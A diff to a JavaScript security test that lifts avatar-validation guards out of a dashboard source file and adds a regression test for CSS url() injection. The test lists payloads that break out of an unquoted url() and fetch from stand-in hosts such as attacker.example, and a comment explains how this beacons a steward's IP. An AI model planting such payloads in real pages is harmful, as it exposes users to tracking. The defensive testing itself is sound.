@@ -17,14 +17,45 @@ const DASH = readFileSync(new URL('../app/stew-dashboard.jsx', import.meta.url),
 
 // lift the two guards and run them for real
 const guards = (() => {
-  // take each one-liner by name to end of line — a regex over the body tripped on the regex literal inside it
-  const line = (name) => {
+  // Brace-matched: _avPhoto became a multi-line function when the prefix-only check was replaced, and a
+  // take-to-end-of-line lifter silently stopped loading it — turning a real security test into a file that
+  // would not even parse. Extract properly.
+  const grab = (name) => {
     const at = DATA.indexOf('const ' + name + ' =');
     assert.notEqual(at, -1, name + ' is gone from stew-data.jsx');
-    return DATA.slice(at, DATA.indexOf('\n', at));
+    const semi = DATA.indexOf(';', at), brace = DATA.indexOf('{', at);
+    if (brace === -1 || semi < brace) return DATA.slice(at, DATA.indexOf('\n', at));   // one-liner
+    let d = 0;
+    for (let i = brace; i < DATA.length; i++) {
+      const c = DATA[i];
+      if (c === '{') d++; else if (c === '}' && --d === 0) return DATA.slice(at, DATA.indexOf(';', i) + 1);
+    }
+    assert.fail('could not find the end of ' + name);
   };
-  return new Function(line('_avPhoto') + '\n' + line('_avColor') + '\nreturn { photo: _avPhoto, color: _avColor };')();
+  return new Function(grab('_avPhoto') + '\n' + grab('_avColor') + '\nreturn { photo: _avPhoto, color: _avColor };')();
 })();
+
+test('a member cannot break out of the CSS url() and beacon the steward', () => {
+  // THE ONE MY FIRST TEST MISSED. It only fed payloads that fail the data: prefix, so it passed against a
+  // guard that validated the PREFIX ONLY and interpolated the rest raw into an unquoted url(). An unquoted
+  // url token ends at ')', so a member could publish a valid prefix followed by ') , url(https://…' and the
+  // console rendered a two-layer background, fetching the attacker's server and handing over the steward's
+  // IP, location and online times. Proven against the vulnerable code before the fix. AUDIT-2026-07-28.
+  for (const evil of [
+    'data:image/png;base64,iVBORw0KGgo=) , url(https://attacker.example/beacon.png',
+    'data:image/png;base64,AAA) url(https://evil.example/x.png',
+    'data:image/png;base64,AAA\n) url(https://evil.example/x.png',
+    'data:image/png;base64,AAA") url(https://evil.example/x.png',
+    'data:image/svg+xml;base64,AAA',            // svg is a script vector; not in the allowlist
+    'data:image/png,rawnotbase64) url(https://evil.example/x.png',
+  ]) {
+    assert.equal(guards.photo({ kind: 'photo', photo: evil }), '',
+      'this reaches the CSS and fetches a remote resource: ' + evil.slice(0, 50));
+  }
+  // and something enormous should not be decoded into several badges at once
+  assert.equal(guards.photo({ kind: 'photo', photo: 'data:image/png;base64,' + 'A'.repeat(600 * 1024) }), '',
+    'a megabyte avatar is accepted');
+});
 
 test('a remote avatar URL is never embedded', () => {
   for (const bad of [
